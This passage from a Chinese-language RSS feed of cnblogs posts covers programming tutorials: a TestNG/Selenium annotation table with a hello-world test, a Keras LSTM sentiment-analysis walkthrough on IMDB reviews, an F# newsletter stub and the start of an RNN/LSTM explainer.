&lt;p align=&quot;center&quot;&gt;&lt;strong&gt;注解&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@BeforeSuite&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;注解的方法将只运行一次，运行所有测试前此套件中。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@AfterSuite&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;注解的方法将只运行一次此套件中的所有测试都运行之后。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@BeforeClass&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;注解的方法将只运行一次先行先试在当前类中的方法调用。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@AfterClass&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;注解的方法将只运行一次后已经运行在当前类中的所有测试方法。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@BeforeTest&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;注解的方法将被运行之前的任何测试方法属于内部类的 &amp;lt;test&amp;gt;标签的运行。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@AfterTest&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;注解的方法将被运行后，所有的测试方法，属于内部类的&amp;lt;test&amp;gt;标签的运行。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4.5&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@BeforeGroups&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;6&quot;&gt;
&lt;p&gt;组的列表，这种配置方法将之前运行。此方法是保证在运行属于任何这些组第一个测试方法，该方法被调用。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4.5&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@AfterGroups&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;6&quot;&gt;
&lt;p&gt;组的名单，这种配置方法后，将运行。此方法是保证运行后不久，最后的测试方法，该方法属于任何这些组被调用。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@BeforeMethod&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;注解的方法将每个测试方法之前运行。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@AfterMethod&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;被注释的方法将被运行后，每个测试方法。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;8&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@DataProvider&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;9&quot;&gt;
&lt;p&gt;标志着一个方法，提供数据的一个测试方法。注解的方法必须返回一个Object[] []，其中每个对象[]的测试方法的参数列表中可以分配。&lt;/p&gt;
&lt;p&gt;该@Test 方法，希望从这个DataProvider的接收数据，需要使用一个dataProvider名称等于这个注解的名字。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4.5&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@Factory&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;6&quot;&gt;
&lt;p&gt;作为一个工厂，返回TestNG的测试类的对象将被用于标记的方法。该方法必须返回Object[]。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@Listeners&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;定义一个测试类的监听器。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@Parameters&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;介绍如何将参数传递给@Test方法。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;
&lt;p&gt;&lt;strong&gt;@Test&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;5&quot;&gt;
&lt;p&gt;标记一个类或方法作为测试的一部分。&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;关于testng的使用方法网上有很多，需要关注的是,testng与junit的区别，经常被用来当做面试问题。testng可以认为是junit的升级版。&lt;/p&gt;
&lt;p&gt;新建testng class成功后，录入以下代码&lt;/p&gt;
&lt;p&gt;package com.UI.testDemo;&lt;/p&gt;
&lt;p&gt;import org.testng.annotations.Test;&lt;br/&gt;import org.testng.annotations.BeforeMethod;&lt;br/&gt;import org.testng.annotations.AfterMethod;&lt;br/&gt;import org.testng.annotations.DataProvider;&lt;br/&gt;import org.testng.annotations.BeforeClass;&lt;br/&gt;import org.openqa.selenium.By;&lt;br/&gt;import org.openqa.selenium.WebDriver;&lt;br/&gt;import org.openqa.selenium.chrome.ChromeDriver;&lt;br/&gt;import org.testng.annotations.AfterClass;&lt;br/&gt;import org.testng.annotations.BeforeTest;&lt;br/&gt;import org.testng.annotations.AfterTest;&lt;/p&gt;
&lt;p&gt;public class helloworld {&lt;br/&gt;WebDriver driver;//定义一个webdrive驱动&lt;/p&gt;
&lt;p&gt;@BeforeMethod&lt;br/&gt;public void beforeMethod() {&lt;br/&gt;}&lt;/p&gt;
&lt;p&gt;@AfterMethod&lt;br/&gt;public void afterMethod() {&lt;br/&gt;System.out.println(&quot;Page title is:&quot;+driver.getTitle());//输出页面标题&lt;br/&gt;driver.quit();//关闭浏览器&lt;br/&gt;}&lt;br/&gt;@Test&lt;br/&gt;public void test_case() {&lt;br/&gt;driver=new ChromeDriver();//新建一个谷歌浏览器驱动&lt;br/&gt;driver.get(&quot;http://www.baidu.com&quot;);//打开浏览器，并打开百度页面&lt;br/&gt;}&lt;/p&gt;
&lt;p&gt;@BeforeClass&lt;br/&gt;public void beforeClass() {&lt;br/&gt;}&lt;/p&gt;
&lt;p&gt;@AfterClass&lt;br/&gt;public void afterClass() {&lt;br/&gt;}&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;}&lt;/p&gt;

&lt;p&gt;如果你成功打开了浏览器，并跳转到了百度页面，而且eclipse控制台输出了百度页面的标题，并且能够关闭浏览器&lt;/p&gt;
&lt;p&gt;那恭喜你，配置和项目都已经没有问题了，接下来就可以写自动化UI测试脚本了 &lt;/p&gt;
&lt;p&gt; 另外，看到两篇关于如何在jenkins中执行testng脚本的文章，地址如下：&lt;/p&gt;
&lt;p&gt;https://blog.csdn.net/lykangjia/article/details/72770461&lt;/p&gt;
&lt;p&gt;https://www.cnblogs.com/chengbai/p/9948095.html&lt;/p&gt;

</description>
<pubDate>Sun, 24 Feb 2019 15:21:00 +0000</pubDate>
<dc:creator>LuLu泡</dc:creator>
<og:description>1.新建maven项目 2.下载selenium的jar包，放入maven依赖库中 3.新增testng依赖库，build path-&gt;add libirary-&gt;testng 4.查看自</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/muzipaopao/p/10428666.html</dc:identifier>
</item>
<item>
<title>深度学习框架Keras介绍及实战 - sdu20112013</title>
<link>http://www.cnblogs.com/sdu20112013/p/10428471.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sdu20112013/p/10428471.html</guid>
<description>&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;Keras 是一个用 Python 编写的高级神经网络 API，它能够以 TensorFlow, CNTK, 或者 Theano 作为后端运行。Keras 的开发重点是支持快速的实验。能够以最小的时延把你的想法转换为实验结果，是做好研究的关键。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本文以Kaggle上的项目:IMDB影评情感分析为例,学习如何用Keras搭建一个神经网络,处理实际问题.阅读本文需要对神经网络有基础的了解.&lt;br/&gt;文章分为两个部分:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Keras中的一些基本概念.Api用法.我会给出一些简单的使用样例,或是给出相关知识链接.&lt;/li&gt;
&lt;li&gt;IMDB影评情感分析实战.用到的都是第一部分中讲到的知识点.&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;model&quot;&gt;Model&lt;/h3&gt;
&lt;h4 id=&quot;dense-全连接层&quot;&gt;Dense 全连接层&lt;/h4&gt;
&lt;blockquote readability=&quot;16&quot;&gt;
&lt;p&gt;keras.layers.core.Dense(units, activation=None, use_bias=True, k&lt;br/&gt;ernel_initializer='glorot_uniform', bias_initializer='zeros', ke&lt;br/&gt;rnel_regularizer=None, bias_regularizer=None, activity_regulariz&lt;br/&gt;er=None, kernel_constraint=None, bias_constraint=None)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code&gt;# as first layer in a sequential model:
# as first layer in a sequential model:
model = Sequential()
model.add(Dense(32, input_shape=(16,)))
# now the model will take as input arrays of shape (*, 16)
# and output arrays of shape (*, 32)
# after the first layer, you don't need to specify
# the size of the input anymore:
model.add(Dense(32))&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;嵌入层-embedding&quot;&gt;嵌入层 Embedding&lt;/h4&gt;
&lt;blockquote readability=&quot;14&quot;&gt;
&lt;p&gt;keras.layers.embeddings.Embedding(input_dim, output_dim, embeddi&lt;br/&gt;ngs_initializer='uniform', embeddings_regularizer=None, activity&lt;br/&gt;_regularizer=None, embeddings_constraint=None, mask_zero=False,&lt;br/&gt;input_length=None)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;有兴趣的看这个链接https://machinelearningmastery.com/use-word-embedding-layers-deep-learning-keras/&lt;br/&gt;其实就是word to vector。 这一层的作用就是得到用词向量表示的文本.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;input_dim: 词表的大小.即不同的词的总个数.&lt;/li&gt;
&lt;li&gt;output_dim:想要把词转换成多少维的向量.&lt;/li&gt;
&lt;li&gt;input_length: 每一句的词的个数&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;比如如下代表:我们输入一个M*50的矩阵,这个矩阵中不同的词的个数为200,我们想把每个词转换为32维向量. 返回的是一个(M,50,32)的张量.&lt;br/&gt;一个句子50个词,每个词是32维向量,共M个句子. 所以是e.shape=(M,50,32)&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;e = Embedding(200, 32, input_length=50)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;lstm层.&quot;&gt;LSTM层.&lt;/h4&gt;
&lt;p&gt;LSTM是循环神经网络的一种特殊情况.http://deeplearning.net/tutorial/lstm.html&lt;br/&gt;简单来说,我们此前说过的神经网络,包括CNN,都是单向的,没有考虑序列关系,但是某个词的意义与其上下文是有关的,比如&quot;我用着小米手机,吃着小米粥&quot;,两个小米肯定不是一个意思.在做语义分析的时候,需要考虑上下文. 循环神经网络RNN就是干这个事情的.或者说&quot;这部电影质量很高,但是我不喜欢&quot;.这个句子里既有正面评价,又有负面评价,参考上下文的LSTM会识别出&quot;但是&quot;后面的才是我们想要重点表达的.&lt;/p&gt;
&lt;blockquote readability=&quot;24&quot;&gt;
&lt;p&gt;keras.layers.recurrent.LSTM(units, activation='tanh', recurrent_&lt;br/&gt;activation='hard_sigmoid', use_bias=True, kernel_initializer='gl&lt;br/&gt;orot_uniform', recurrent_initializer='orthogonal', bias_initiali&lt;br/&gt;zer='zeros', unit_forget_bias=True, kernel_regularizer=None, rec&lt;br/&gt;urrent_regularizer=None, bias_regularizer=None, activity_regular&lt;br/&gt;izer=None, kernel_constraint=None, recurrent_constraint=None, bi&lt;br/&gt;as_constraint=None, dropout=0.0, recurrent_dropout=0.0)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;池化层&quot;&gt;池化层&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;keras.layers.pooling.GlobalMaxPooling1D() #对时间信号的全局最大池化 &lt;a href=&quot;https://stackoverflow.com/questions/43728235/what-is-the-difference-between-keras-maxpooling1d-and-globalmaxpooling1d-functi&quot; class=&quot;uri&quot;&gt;https://stackoverflow.com/questions/43728235/what-is-the-difference-between-keras-maxpooling1d-and-globalmaxpooling1d-functi&lt;/a&gt;
&lt;ul&gt;&lt;li&gt;input:形如（ samples， steps， features） 的3D张量&lt;/li&gt;
&lt;li&gt;output:形如(samples, features)的2D张量&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;keras.layers.pooling.MaxPooling1D(pool_size=2, strides=None, pad&lt;br/&gt;ding='valid')&lt;/li&gt;
&lt;li&gt;keras.layers.pooling.MaxPooling2D(pool_size=(2, 2), strides=None&lt;br/&gt;, padding='valid', data_format=None)&lt;/li&gt;
&lt;li&gt;keras.layers.pooling.MaxPooling3D(pool_size=(2, 2, 2), strides=N&lt;br/&gt;one, padding='valid', data_format=None)&lt;/li&gt;
&lt;li&gt;....&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;数据预处理&quot;&gt;数据预处理&lt;/h3&gt;
&lt;h4 id=&quot;文本预处理&quot;&gt;文本预处理&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;keras.preprocessing.text.text_to_word_sequence(text,&lt;br/&gt;filters=base_filter(), lower=True, split=&quot; &quot;)&lt;/li&gt;
&lt;li&gt;keras.preprocessing.text.one_hot(text, n,&lt;br/&gt;filters=base_filter(), lower=True, split=&quot; &quot;)&lt;/li&gt;
&lt;li&gt;keras.preprocessing.text.Tokenizer(num_words=None, filters=base_&lt;br/&gt;filter(),&lt;br/&gt;lower=True, split=&quot; &quot;)&lt;br/&gt;Tokenizer是一个用于向量化文本， 或将文本转换为序列（ 即单词在字典中的下标构&lt;br/&gt;成的列表， 从1算起） 的类。
&lt;ul&gt;&lt;li&gt;num_words： None或整数， 处理的最大单词数量。 若被设置为整数， 则分词器&lt;br/&gt;将被限制为处理数据集中最常见的 num_words 个单词&lt;/li&gt;
&lt;li&gt;不管num_words是几,fit_on_texts以后词典都是一样的,全部的词都有对应的index.只是在做texts_to_sequences时所得结果不同.&lt;/li&gt;
&lt;li&gt;会取最常出现的(num_words - 1)个词对应的index来代表句子.&lt;/li&gt;
&lt;li&gt;注意num_words不同时,准换后X_t的不同. 只取词典中出现最多的num_words - 1代表句子.如果一个句子中出现特别生僻的词,就会被过滤掉.比如一个句子=&quot;x y z&quot;.y,z不在词典中最常出现的top num_words-1的话,最后这个句子的向量形式则为[x_index_in_dic]&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;t1=&quot;i love that girl&quot;
t2='i hate u'
texts=[t1,t2]
tokenizer = Tokenizer(num_words=None)
tokenizer.fit_on_texts(texts)  #得到词典 每个词对应一个index.
print( tokenizer.word_counts) #OrderedDict([('i', 2), ('love', 1), ('that', 1), ('girl', 1), ('hate', 1), ('u', 1)])
print( tokenizer.word_index) #{'i': 1, 'love': 2, 'that': 3, 'girl': 4, 'hate': 5, 'u': 6}
print( tokenizer.word_docs) #{'i': 2, 'love': 1, 'that': 1, 'girl': 1, 'u': 1, 'hate': 1})
print( tokenizer.index_docs) #{1: 2, 2: 1, 3: 1, 4: 1, 6: 1, 5: 1}
tokennized_texts = tokenizer.texts_to_sequences(texts) 
print(tokennized_texts) #[[1, 2, 3, 4], [1, 5, 6]] 每个词由其index表示

X_t = pad_sequences(tokennized_texts, maxlen=None) #转换为2d array 即矩阵形式. 每个文本的词的个数均为maxlen. 不存在的词用0表示.
print(X_t)#[[1 2 3 4][0 1 5 6]]
    &lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;序列预处理&quot;&gt;序列预处理&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;keras.preprocessing.sequence.pad_sequences(sequences, maxlen=None&lt;br/&gt;, dtype='int32',&lt;br/&gt;padding='pre', truncating='pre', value=0.)&lt;br/&gt;返回一个2阶张量&lt;/li&gt;
&lt;li&gt;keras.preprocessing.sequence.skipgrams(sequence, vocabulary_size&lt;br/&gt;,&lt;br/&gt;window_size=4, negative_samples=1., shuffle=True,&lt;br/&gt;categorical=False, sampling_table=None)&lt;/li&gt;
&lt;li&gt;keras.preprocessing.sequence.make_sampling_table(size, sampling_&lt;br/&gt;factor=1e-5)&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;p&gt;keras实战:IMDB影评情感分析&lt;/p&gt;
&lt;p&gt;数据集介绍&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;labeledTrainData.tsv/imdb_master.csv 影评数据集 已经标注对电影是正面/负面评价&lt;/li&gt;
&lt;li&gt;testData.tsv 测试集 需要预测评论是正面/负面&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;主要步骤&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;数据读取&lt;/li&gt;
&lt;li&gt;数据清洗 主要包括去除停词,去除html tag,去除标点符号&lt;/li&gt;
&lt;li&gt;模型构建
&lt;ul&gt;&lt;li&gt;嵌入层:完成词到向量的转换&lt;/li&gt;
&lt;li&gt;LSTM&lt;/li&gt;
&lt;li&gt;池化层:完成重要特征抽取&lt;/li&gt;
&lt;li&gt;全连接层：分类&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;数据加载&quot;&gt;数据加载&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;import pandas as pd
import matplotlib.pyplot as plt
import numpy as np
df_train = pd.read_csv(&quot;./dataset/word2vec-nlp-tutorial/labeledTrainData.tsv&quot;, header=0, delimiter=&quot;\t&quot;, quoting=3)
df_train1=pd.read_csv(&quot;./dataset/imdb-review-dataset/imdb_master.csv&quot;,encoding=&quot;latin-1&quot;)
df_train1=df_train1.drop([&quot;type&quot;,'file'],axis=1)
df_train1.rename(columns={'label':'sentiment',
                          'Unnamed: 0':'id',
                          'review':'review'}, 
                 inplace=True)
df_train1 = df_train1[df_train1.sentiment != 'unsup']
df_train1['sentiment'] = df_train1['sentiment'].map({'pos': 1, 'neg': 0})
new_train=pd.concat([df_train,df_train1])
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;数据清洗&quot;&gt;数据清洗&lt;/h4&gt;
&lt;p&gt;用bs4处理html数据&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;过滤出单词&lt;/li&gt;
&lt;li&gt;去除停用词&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;import re
from bs4 import BeautifulSoup
from nltk.corpus import stopwords
def review_to_words( raw_review ):
    review_text = BeautifulSoup(raw_review, 'lxml').get_text() 
    letters_only = re.sub(&quot;[^a-zA-Z]&quot;, &quot; &quot;, review_text) 
    words = letters_only.lower().split()                           
    stops = set(stopwords.words(&quot;english&quot;))                  
    meaningful_words = [w for w in words if not w in stops]   

    return( &quot; &quot;.join( meaningful_words ))   

new_train['review']=new_train['review'].apply(review_to_words)
df_test[&quot;review&quot;]=df_test[&quot;review&quot;].apply(review_to_words)&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;keras搭建网络&quot;&gt;Keras搭建网络&lt;/h4&gt;
&lt;p&gt;文本转换为矩阵&lt;br/&gt;- Tokenizer作用于list(sentence)得到词典.将词用词在词典中的Index做替换,得到数字矩阵&lt;br/&gt;- pad_sequences做补0. 保证矩阵每一行数目相等. 即每个句子有相同数量的词.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;list_classes = [&quot;sentiment&quot;]
y = new_train[list_classes].values
print(y.shape)
list_sentences_train = new_train[&quot;review&quot;]
list_sentences_test = df_test[&quot;review&quot;]

max_features = 6000
tokenizer = Tokenizer(num_words=max_features)
tokenizer.fit_on_texts(list(list_sentences_train))
list_tokenized_train = tokenizer.texts_to_sequences(list_sentences_train)
list_tokenized_test = tokenizer.texts_to_sequences(list_sentences_test)

print(len(tokenizer.word_index))

totalNumWords = [len(one_comment) for one_comment in list_tokenized_train]
print(max(totalNumWords),sum(totalNumWords) / len(totalNumWords))

maxlen = 400
X_t = pad_sequences(list_tokenized_train, maxlen=maxlen)
X_te = pad_sequences(list_tokenized_test, maxlen=maxlen)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;模型构建&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;词转向量&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;inp = Input(shape=(maxlen, ))
print(inp.shape) # (?, 400) #每个句子400个词
embed_size = 128 #每个词转换成128维的向量
x = Embedding(max_features, embed_size)(inp)
print(x.shape) #(?, 400, 128)&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;LSTM 60个神经元&lt;/li&gt;
&lt;li&gt;GlobalMaxPool1D 相当于抽取出最重要的神经元输出&lt;/li&gt;
&lt;li&gt;DropOut 丢弃部分输出 引入正则化,防止过拟合&lt;/li&gt;
&lt;li&gt;Dense 全连接层&lt;/li&gt;
&lt;li&gt;模型编译时指定损失函数,优化器,模型效果评测标准&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;x = LSTM(60, return_sequences=True,name='lstm_layer')(x)
print(x.shape)
x = GlobalMaxPool1D()(x)
print(x.shape)
x = Dropout(0.1)(x)
print(x.shape)
x = Dense(50, activation=&quot;relu&quot;)(x)
print(x.shape)
x = Dropout(0.1)(x)
print(x.shape)
x = Dense(1, activation=&quot;sigmoid&quot;)(x)
print(x.shape)
model = Model(inputs=inp, outputs=x)
model.compile(loss='binary_crossentropy',
                  optimizer='adam',
                  metrics=['accuracy'])
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;模型训练&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;batch_size = 32
epochs = 2
print(X_t.shape,y.shape)
model.fit(X_t,y, batch_size=batch_size, epochs=epochs, validation_split=0.2)&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;使用模型预测&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;prediction = model.predict(X_te)
y_pred = (prediction &amp;gt; 0.5)&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sun, 24 Feb 2019 14:52:00 +0000</pubDate>
<dc:creator>sdu20112013</dc:creator>
<og:description>Keras 是一个用 Python 编写的高级神经网络 API，它能够以 TensorFlow, CNTK, 或者 Theano 作为后端运行。Keras 的开发重点是支持快速的实验。能够以最小的时延</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sdu20112013/p/10428471.html</dc:identifier>
</item>
<item>
<title>F#周报2019年第8期 - Ken.W</title>
<link>http://www.cnblogs.com/kenwoo/p/10428548.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kenwoo/p/10428548.html</guid>
<description>[unable to retrieve full-text content]新闻 &quot;Fable 2.2发布，支持匿名记录&quot; &quot;Paket提升还原时间&quot; &quot;Microsoft.Jupyter.Core预览&quot; &quot;.NET Framework 4.8早期可访问编译版本3745&quot; 博客 &quot;使用SAFE技术栈进行服务端渲染&quot; &quot;CNTK 102.5：在F 的Jupyter里使用Gra</description>
<pubDate>Sun, 24 Feb 2019 14:52:00 +0000</pubDate>
<dc:creator>Ken.W</dc:creator>
<og:description>新闻 'Fable 2.2发布，支持匿名记录' 'Paket提升还原时间' 'Microsoft.Jupyter.Core预览' '.NET Framework 4.8早期可访问编译版本3745' 博</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kenwoo/p/10428548.html</dc:identifier>
</item>
<item>
<title>浅谈RNN、LSTM + Kreas实现及应用 - 泽积</title>
<link>http://www.cnblogs.com/shenpings1314/p/10428519.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/shenpings1314/p/10428519.html</guid>
<description>&lt;p&gt;&lt;span&gt;本文主要针对RNN与LSTM的结构及其原理进行详细的介绍，了解什么是RNN，RNN的1对N、N对1的结构，什么是LSTM，以及LSTM中的三门（input、ouput、forget），后续将利用深度学习框架Kreas，结合案例对LSTM进行进一步的介绍。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;一、RNN的原理&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　RNN（Recurrent Neural Networks），即全称循环神经网络，它是一种对序列型的数据进行建模的深度模型。如图1.1所示。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224214731927-1550328660.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.1&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;　　1、其中&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223525990-2091498851.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;为序列数据。即神经网络的输入，例如&lt;span lang=&quot;EN-US&quot;&gt;nlp中，X&lt;sub&gt;1&lt;/sub&gt;&lt;span lang=&quot;EN-US&quot;&gt;可以看作第一个单词、X&lt;sub&gt;2&lt;/sub&gt;&lt;span lang=&quot;EN-US&quot;&gt;可以看作是第二个单词，依次类推。语音处理中，可以将&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223532201-222061222.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;是每帧的声音信号。时间序列中，例如，某生活用品的销量数据。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
